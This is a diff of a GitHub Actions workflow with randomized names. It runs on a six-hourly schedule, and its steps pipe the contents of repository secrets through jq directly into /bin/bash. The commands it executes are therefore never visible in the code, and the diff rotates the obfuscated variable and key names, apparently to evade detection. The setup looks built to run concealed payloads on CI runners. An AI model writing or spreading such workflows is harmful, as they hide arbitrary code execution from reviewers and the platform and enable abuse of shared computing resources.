@@ -1,10 +1,10 @@
 name: huachenshui6473
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
-jobs:  # 12228
+    - cron: '6 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +12,12 @@ jobs:  # 12228
       - uses: actions/checkout@v4
       - name: huachenshui6473
         env:
-          wr26703: ${{ secrets.wr26703 }}
+          gj444: ${{ secrets.gj444 }}
         run: |
-          echo $wr26703 | jq -r .p7277 | /bin/bash
-          echo $l715 | jq -r .fk22 | /bin/bash
-          echo $uix48 | jq -r .yi81413 | /bin/bash
-          echo $r0695 | jq -r .ab63 | /bin/bash
-          echo $oury0522 | jq -r .bkjc83563 | /bin/bash
-          echo $rbmw3 | jq -r .bw49 | /bin/bash
-          echo $hst8 | jq -r .it5510 | /bin/bash
-          echo $v4231 | jq -r .sqou0 | /bin/bash
-          echo $jp3 | jq -r .vy9 | /bin/bash
-          echo $irlu5 | jq -r .idvq758 | /bin/bash
-          echo $yb53 | jq -r .hiln21525 | /bin/bash
-          echo $x97 | jq -r .gw06 | /bin/bash
-          echo $y85089 | jq -r .gwf3 | /bin/bash
+          echo $gj444 | jq -r .pzv37 | /bin/bash
+          echo $lyk8098 | jq -r .pg19 | /bin/bash
+          echo $cfviu383 | jq -r .qzf06430 | /bin/bash
+          echo $wgtir167 | jq -r .njpb67 | /bin/bash
+          echo $omy93299 | jq -r .ipjw24217 | /bin/bash
+          echo $rtnz924 | jq -r .qt09726 | /bin/bash
 
